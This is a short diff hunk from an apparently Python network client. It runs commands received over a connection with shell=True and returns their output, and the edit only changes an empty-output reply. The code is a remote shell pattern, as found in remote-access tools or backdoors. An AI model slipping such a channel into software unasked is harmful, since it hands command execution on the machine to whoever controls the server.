@@ -32,7 +32,7 @@ class Client:
 					if data.split("|")[0] == "CMD":
 						output, err = subprocess.Popen(data[4:].split(" "), stdout=subprocess.PIPE, shell=True, text=True, stderr=subprocess.PIPE).communicate()
 						if not output and not err:
-							self.send(f"CMD ")
+							self.send(f"CMDError")
 						self.send(f"CMD{output or err}")
 
 				time.sleep(0.01)
